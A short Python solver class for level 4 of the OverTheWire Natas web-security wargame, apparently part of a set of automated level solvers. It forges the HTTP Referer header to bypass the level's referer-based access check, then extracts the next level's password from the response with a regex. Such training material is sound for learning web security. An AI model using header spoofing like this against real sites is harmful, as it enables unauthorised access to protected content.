import re 
from .base_solver import NatasSolver

class Natas4Solver(NatasSolver):
    def solve(self) -> str:
        # Set Referer header to access from natas5
        response = self.make_request(
            headers={"Referer": "http://natas5.natas.labs.overthewire.org/"}
        )
        if "Access granted" not in response.text:
            raise ValueError("Access denied")
            
        match = re.findall(r"The password for natas5 is (.*)", response.text)
        if not match:
            raise ValueError("Could not find password")
        return match[0].strip()